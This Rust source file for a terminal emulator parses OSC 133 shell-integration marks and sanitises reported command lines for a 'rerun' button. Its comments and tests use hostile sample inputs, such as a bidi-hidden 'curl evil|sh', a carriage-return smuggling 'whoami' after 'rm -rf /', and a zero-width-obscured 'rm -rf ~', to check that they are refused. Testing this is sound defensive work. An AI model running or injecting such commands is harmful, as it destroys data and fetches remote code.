//! Backend-neutral OSC 133 command marks.
//!
//! The scanner runs on the existing PTY reader path. It owns only fixed-size
//! state, accepts BEL and ST terminators, and drops malformed or oversized
//! payloads without allocating.

use std::collections::VecDeque;
use std::sync::{Arc, Mutex};
use std::time::Instant;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum MarkKind {
    PromptStart,
    CommandStart,
    OutputStart,
    CommandFinished,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct RawMark {
    pub kind: MarkKind,
    pub exit_code: Option<i32>,
}

/// What one recognised OSC 133 sequence turned out to be.
///
/// Two kinds, because the shell reports two different things down one channel:
/// where it is in the prompt/command cycle, and - through `133;E`, which
/// Splitlane's own shell integration emits - what the command actually was.
/// The command borrows the scanner's fixed buffer, so recognising one still
/// allocates nothing; whoever wants to keep it copies it.
#[derive(Debug, PartialEq, Eq)]
pub enum ScanEvent<'a> {
    Mark(RawMark),
    CommandLine(&'a [u8]),
}

/// A reported command line, accepted only if it is safe to show AND safe to
/// send - which is one question, not two: the affordance promises that what
/// the header names is what the shell will run.
///
/// Rejects rather than repairs, and that is the load-bearing choice. Every
/// repair silently produces a DIFFERENT command from the one reported:
/// shortening `rm -rf /home/me/project/build` at a cap yields `rm -rf /home`;
/// dropping the `\r` from `ls\rrm -rf ~` yields something the label showed but
/// the shell would never have been given; flattening a multi-line command
/// turns a heredoc into nonsense. A command we cannot carry faithfully is one
/// we decline to offer at all, and the header simply has no rerun on it.
///
/// The stream is not trusted. Any program can print an OSC 133, and untrusted
/// output reaches a terminal constantly - `cat` on a downloaded file, a CI log,
/// an ssh session to a host someone else owns. So the rejected set is wider
/// than C0/C1:
///
/// - **control characters**, because a `\r` would submit content the label
///   never showed, and an `\x1b` would end the OSC early and leave its tail to
///   be read as terminal input;
/// - **bidi and format controls**, because `cat<U+202E>;curl evil|sh` renders
///   in an order that does not match its bytes - the set is the one rustc's
///   own `text_direction_codepoint` lint refuses in source literals, plus the
///   zero-width family, which hides a word boundary the reader is relying on;
/// - **anything longer than [`MAX_COMMAND_LINE_CHARS`]**, refused, not cut.
///
/// Longer payloads mostly never arrive: the scanner's fixed [`PAYLOAD_CAP`] is
/// twice the character cap in bytes, and a payload that overruns it is dropped
/// without ever being emitted - a refusal too, not a truncation.
pub fn sanitize_command_line(payload: &[u8]) -> Option<String> {
    // A report we cannot read is a command we must not offer to run, so
    // invalid UTF-8 is refused rather than replaced with U+FFFD.
    let text = std::str::from_utf8(payload).ok()?;
    if text.chars().count() > MAX_COMMAND_LINE_CHARS {
        return None;
    }
    if text.chars().any(is_unsafe_in_a_command) {
        return None;
    }
    let trimmed = text.trim();
    (!trimmed.is_empty()).then(|| trimmed.to_string())
}

/// A character that makes a command line unsafe to show or to send. See
/// [`sanitize_command_line`] for why each group is in here.
fn is_unsafe_in_a_command(c: char) -> bool {
    c.is_control()
        || matches!(c,
            '\u{061c}' | '\u{200e}' | '\u{200f}'
            | '\u{202a}'..='\u{202e}'
            | '\u{2066}'..='\u{2069}'
            | '\u{200b}'..='\u{200d}' | '\u{feff}'
            | '\u{2028}' | '\u{2029}')
}

#[derive(Debug, Clone, Copy)]
pub struct CommandMark {
    pub kind: MarkKind,
    /// Retained for OSC 133 exit-dot rendering and structured command export.
    #[allow(dead_code)]
    pub exit_code: Option<i32>,
    pub abs_line: i64,
    /// Cursor column when the mark was recorded. For `CommandStart` - which a
    /// shell integration prints at the END of its prompt, alone, while the
    /// terminal then sits idle waiting for the user to type - this is exactly
    /// where the command text begins, which is what makes "rerun the last
    /// command" able to name the command rather than guess at it.
    pub column: usize,
    /// Retained for command duration rendering and structured command export.
    #[allow(dead_code)]
    pub at: Instant,
}

pub const MAX_MARKS: usize = 1_000;
pub type SharedMarkRing = Arc<Mutex<MarkRing>>;

/// The newest command line the shell reported, shared between the PTY reader
/// thread that learns it and the render thread that draws it.
pub type SharedLastCommand = Arc<Mutex<Option<String>>>;

#[derive(Default)]
pub struct MarkRing {
    marks: VecDeque<CommandMark>,
}

impl MarkRing {
    pub fn push(&mut self, mark: CommandMark) {
        if self.marks.len() == MAX_MARKS {
            self.marks.pop_front();
        }
        self.marks.push_back(mark);
    }

    pub fn retain_at_or_below(&mut self, max_abs_line: i64) {
        self.marks.retain(|mark| mark.abs_line <= max_abs_line);
    }

    /// The last command the shell ran, as a `(start, end)` pair of marks: the
    /// `CommandStart` that opened it and the `OutputStart` that closed it.
    ///
    /// Walks back to the newest `OutputStart` first and only then looks for its
    /// `CommandStart`, because the newest `CommandStart` in the ring is
    /// normally the prompt the user is sitting at right now - a command that
    /// has not been typed yet, let alone run.
    pub fn last_command_span(&self) -> Option<(CommandMark, CommandMark)> {
        let end_idx = self
            .marks
            .iter()
            .rposition(|mark| mark.kind == MarkKind::OutputStart)?;
        let start = self
            .marks
            .iter()
            .take(end_idx)
            .rfind(|mark| mark.kind == MarkKind::CommandStart)?;
        Some((*start, self.marks[end_idx]))
    }

    /// Whether the shell is sitting at a prompt rather than inside a running
    /// command. Sending text into a running program is not a rerun, so the
    /// affordance is withheld until the shell is ready for one.
    pub fn at_prompt(&self) -> bool {
        matches!(
            self.marks.back().map(|mark| mark.kind),
            Some(MarkKind::PromptStart | MarkKind::CommandStart | MarkKind::CommandFinished)
        )
    }

    /// Exposes complete marks to OSC 133 exit-dot rendering and command export.
    #[allow(dead_code)]
    pub fn iter(&self) -> impl Iterator<Item = &CommandMark> {
        self.marks.iter()
    }

    pub fn prompt_before(&self, abs_line: i64) -> Option<i64> {
        self.marks
            .iter()
            .rev()
            .filter(|mark| mark.kind == MarkKind::PromptStart)
            .map(|mark| mark.abs_line)
            .find(|line| *line < abs_line)
    }

    pub fn prompt_after(&self, abs_line: i64) -> Option<i64> {
        self.marks
            .iter()
            .filter(|mark| mark.kind == MarkKind::PromptStart)
            .map(|mark| mark.abs_line)
            .find(|line| *line > abs_line)
    }
}

/// Fixed payload buffer for one OSC 133 sequence. A mark's own payload is a
/// handful of bytes; the size is what `133;E` needs - the command line the
/// shell is about to run, which the header's "↻ rerun" names. Still fixed, so
/// the scanner allocates nothing however hostile the stream is.
const PAYLOAD_CAP: usize = 512;

/// And how long a command may be and still be offered. A longer one is
/// REFUSED, never shortened: a shortened command is a different command, and
/// the difference is exactly where the harm lives.
pub const MAX_COMMAND_LINE_CHARS: usize = 256;
const OSC_PREFIX: &[u8] = b"133;";

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ScanState {
    Ground,
    Esc,
    Prefix(u8),
    Payload,
    SkipToTerminator,
    PayloadEsc,
    SkipEsc,
}

pub struct Osc133Scanner {
    state: ScanState,
    payload: [u8; PAYLOAD_CAP],
    payload_len: usize,
}

impl Default for Osc133Scanner {
    fn default() -> Self {
        Self {
            state: ScanState::Ground,
            payload: [0; PAYLOAD_CAP],
            payload_len: 0,
        }
    }
}

impl Osc133Scanner {
    pub fn feed(&mut self, bytes: &[u8], on_event: &mut impl FnMut(ScanEvent<'_>)) {
        let mut index = 0;
        while index < bytes.len() {
            match self.state {
                ScanState::Ground => {
                    let Some(offset) = find_escape(&bytes[index..]) else {
                        return;
                    };
                    index += offset + 1;
                    self.state = ScanState::Esc;
                    continue;
                }
                ScanState::Esc => {
                    self.state = if bytes[index] == b']' {
                        ScanState::Prefix(0)
                    } else {
                        ScanState::Ground
                    };
                }
                ScanState::Prefix(matched) => {
                    let byte = bytes[index];
                    if byte == OSC_PREFIX[matched as usize] {
                        let next = matched + 1;
                        self.state = if next as usize == OSC_PREFIX.len() {
                            self.payload_len = 0;
                            ScanState::Payload
                        } else {
                            ScanState::Prefix(next)
                        };
                    } else if matches!(byte, 0x07 | 0x18 | 0x1a) {
                        self.state = ScanState::Ground;
                    } else if byte == 0x1b {
                        self.state = ScanState::SkipEsc;
                    } else {
                        self.state = ScanState::SkipToTerminator;
                    }
                }
                ScanState::Payload => match bytes[index] {
                    0x07 => {
                        self.emit(on_event);
                        self.state = ScanState::Ground;
                    }
                    0x1b => self.state = ScanState::PayloadEsc,
                    0x18 | 0x1a => self.state = ScanState::Ground,
                    byte => {
                        if self.payload_len < PAYLOAD_CAP {
                            self.payload[self.payload_len] = byte;
                            self.payload_len += 1;
                        } else {
                            self.state = ScanState::SkipToTerminator;
                        }
                    }
                },
                ScanState::PayloadEsc => {
                    self.state = match bytes[index] {
                        b'\\' => {
                            self.emit(on_event);
                            ScanState::Ground
                        }
                        0x1b => ScanState::Esc,
                        _ => ScanState::Ground,
                    };
                }
                ScanState::SkipToTerminator => match bytes[index] {
                    0x07 | 0x18 | 0x1a => self.state = ScanState::Ground,
                    0x1b => self.state = ScanState::SkipEsc,
                    _ => {}
                },
                ScanState::SkipEsc => {
                    self.state = match bytes[index] {
                        b'\\' => ScanState::Ground,
                        b']' => ScanState::Prefix(0),
                        0x1b => ScanState::Esc,
                        _ => ScanState::Ground,
                    };
                }
            }
            index += 1;
        }
    }

    fn emit(&mut self, on_event: &mut impl FnMut(ScanEvent<'_>)) {
        if let Some(event) = parse_payload(&self.payload[..self.payload_len]) {
            on_event(event);
        }
        self.payload_len = 0;
    }
}

fn find_escape(bytes: &[u8]) -> Option<usize> {
    const ESCAPES: u64 = u64::from_ne_bytes([0x1b; 8]);
    const LOW_BITS: u64 = u64::from_ne_bytes([0x01; 8]);
    const HIGH_BITS: u64 = u64::from_ne_bytes([0x80; 8]);

    let mut chunks = bytes.chunks_exact(8);
    for (chunk_index, chunk) in chunks.by_ref().enumerate() {
        let word = u64::from_ne_bytes([
            chunk[0], chunk[1], chunk[2], chunk[3], chunk[4], chunk[5], chunk[6], chunk[7],
        ]);
        let candidates = word ^ ESCAPES;
        if candidates.wrapping_sub(LOW_BITS) & !candidates & HIGH_BITS != 0 {
            return chunk
                .iter()
                .position(|byte| *byte == 0x1b)
                .map(|offset| chunk_index * 8 + offset);
        }
    }

    let tail_start = bytes.len() - chunks.remainder().len();
    chunks
        .remainder()
        .iter()
        .position(|byte| *byte == 0x1b)
        .map(|offset| tail_start + offset)
}

fn parse_payload(payload: &[u8]) -> Option<ScanEvent<'_>> {
    let (kind, rest) = payload.split_first()?;
    // `133;E;<command>` is not part of the FinalTerm sequence a prompt walks
    // through - it is what Splitlane's own shell integration reports so the
    // header's "↻ rerun" can name the command instead of guessing at it.
    if *kind == b'E' {
        return Some(ScanEvent::CommandLine(rest.strip_prefix(b";")?));
    }
    let kind = match kind {
        b'A' => MarkKind::PromptStart,
        b'B' => MarkKind::CommandStart,
        b'C' => MarkKind::OutputStart,
        b'D' => MarkKind::CommandFinished,
        _ => return None,
    };
    let exit_code = if kind == MarkKind::CommandFinished {
        rest.strip_prefix(b";").and_then(|code| {
            let code = code.split(|byte| *byte == b';').next().unwrap_or(code);
            std::str::from_utf8(code).ok()?.parse::<i32>().ok()
        })
    } else {
        None
    };
    Some(ScanEvent::Mark(RawMark { kind, exit_code }))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn scan(chunks: &[&[u8]]) -> Vec<RawMark> {
        let mut scanner = Osc133Scanner::default();
        let mut marks = Vec::new();
        for chunk in chunks {
            scanner.feed(chunk, &mut |event| {
                if let ScanEvent::Mark(mark) = event {
                    marks.push(mark);
                }
            });
        }
        marks
    }

    fn scan_commands(chunks: &[&[u8]]) -> Vec<String> {
        let mut scanner = Osc133Scanner::default();
        let mut commands = Vec::new();
        for chunk in chunks {
            scanner.feed(chunk, &mut |event| {
                if let ScanEvent::CommandLine(payload) = event
                    && let Some(command) = sanitize_command_line(payload)
                {
                    commands.push(command);
                }
            });
        }
        commands
    }

    #[test]
    fn a_command_that_cannot_be_carried_faithfully_is_refused_not_repaired() {
        // Each of these, repaired, would name a command the shell was never
        // given - so each one leaves the header with no rerun at all.
        // A CR would submit content the label never showed.
        assert!(scan_commands(&[b"\x1b]133;E;rm -rf /\rwhoami\x07"]).is_empty());
        // A bidi override renders in an order that does not match the bytes.
        assert!(scan_commands(&["\x1b]133;E;cat \u{202e};curl evil|sh\x07".as_bytes()]).is_empty());
        // A zero-width joiner hides a word boundary the reader relies on.
        assert!(scan_commands(&["\x1b]133;E;rm\u{200b} -rf ~\x07".as_bytes()]).is_empty());
        // Over the cap: refused, never shortened - `rm -rf /home/me/x` cut is
        // `rm -rf /home`.
        let long = format!("\x1b]133;E;{}\x07", "a".repeat(MAX_COMMAND_LINE_CHARS + 1));
        assert!(scan_commands(&[long.as_bytes()]).is_empty());
        // Exactly at the cap still passes.
        let at_cap = format!("\x1b]133;E;{}\x07", "a".repeat(MAX_COMMAND_LINE_CHARS));
        assert_eq!(scan_commands(&[at_cap.as_bytes()]).len(), 1);
    }

    #[test]
    fn an_oversized_payload_is_dropped_rather_than_truncated() {
        // The scanner's own buffer overruns before `sanitize_command_line` is
        // reached; that path must refuse too, not emit a shortened prefix.
        let huge = format!("\x1b]133;E;{}\x07", "b".repeat(PAYLOAD_CAP * 2));
        assert!(scan_commands(&[huge.as_bytes()]).is_empty());
    }

    #[test]
    fn a_reported_command_line_survives_a_split_chunk() {
        assert_eq!(
            scan_commands(&[b"\x1b]133;E;cargo test ", b"--workspace\x07"]),
            vec!["cargo test --workspace".to_string()]
        );
        // An empty report is not a command.
        assert!(scan_commands(&[b"\x1b]133;E;\x07"]).is_empty());
    }

    #[test]
    fn recognizes_all_kinds_and_terminators() {
        let marks = scan(&[b"\x1b]133;A\x07\x1b]133;B\x1b\\\x1b]133;C\x07\x1b]133;D;7\x07"]);
        assert_eq!(
            marks,
            vec![
                RawMark {
                    kind: MarkKind::PromptStart,
                    exit_code: None
                },
                RawMark {
                    kind: MarkKind::CommandStart,
                    exit_code: None
                },
                RawMark {
                    kind: MarkKind::OutputStart,
                    exit_code: None
                },
                RawMark {
                    kind: MarkKind::CommandFinished,
                    exit_code: Some(7)
                },
            ]
        );
    }

    #[test]
    fn accepts_every_chunk_boundary() {
        let sequence = b"\x1b]133;D;127\x1b\\";
        for split in 1..sequence.len() {
            assert_eq!(
                scan(&[&sequence[..split], &sequence[split..]]),
                vec![RawMark {
                    kind: MarkKind::CommandFinished,
                    exit_code: Some(127)
                }],
                "split at {split}"
            );
        }
    }

    #[test]
    fn drops_hostile_payload_and_recovers() {
        let payload = vec![b'x'; 64 * 1024];
        let marks = scan(&[b"\x1b]133;D;", &payload, b"\x07\x1b]133;A\x07"]);
        assert_eq!(
            marks,
            vec![RawMark {
                kind: MarkKind::PromptStart,
                exit_code: None
            }]
        );
    }

    #[test]
    fn ring_is_bounded_and_navigable() {
        let mut ring = MarkRing::default();
        for line in 0..MAX_MARKS + 10 {
            ring.push(CommandMark {
                kind: MarkKind::PromptStart,
                exit_code: None,
                abs_line: line as i64,
                column: 0,
                at: Instant::now(),
            });
        }
        assert_eq!(ring.iter().count(), MAX_MARKS);
        assert_eq!(ring.prompt_before(20), Some(19));
        assert_eq!(ring.prompt_after(20), Some(21));
    }

    #[test]
    fn the_last_command_is_the_newest_finished_one_not_the_open_prompt() {
        // The marks a real session leaves: one command that ran, then the
        // prompt the user is sitting at now. The newest `CommandStart` belongs
        // to that open prompt and is not a command at all.
        let mut ring = MarkRing::default();
        for (kind, abs_line, column) in [
            (MarkKind::PromptStart, 10, 0),
            (MarkKind::CommandStart, 10, 12),
            (MarkKind::OutputStart, 11, 0),
            (MarkKind::CommandFinished, 14, 0),
            (MarkKind::PromptStart, 15, 0),
            (MarkKind::CommandStart, 15, 12),
        ] {
            ring.push(CommandMark {
                kind,
                exit_code: None,
                abs_line,
                column,
                at: Instant::now(),
            });
        }
        let (start, end) = ring.last_command_span().expect("a finished command");
        assert_eq!((start.abs_line, start.column), (10, 12));
        assert_eq!(end.abs_line, 11);
        assert!(ring.at_prompt());
    }

    #[test]
    fn a_running_command_is_not_a_prompt() {
        let mut ring = MarkRing::default();
        for kind in [
            MarkKind::PromptStart,
            MarkKind::CommandStart,
            MarkKind::OutputStart,
        ] {
            ring.push(CommandMark {
                kind,
                exit_code: None,
                abs_line: 0,
                column: 0,
                at: Instant::now(),
            });
        }
        assert!(!ring.at_prompt());
    }

    #[test]
    fn escape_search_covers_word_boundaries_and_tail() {
        for offset in 0..24 {
            let mut bytes = vec![b'x'; 24];
            bytes[offset] = 0x1b;
            assert_eq!(find_escape(&bytes), Some(offset));
        }
        assert_eq!(find_escape(&[b'x'; 24]), None);
    }
}
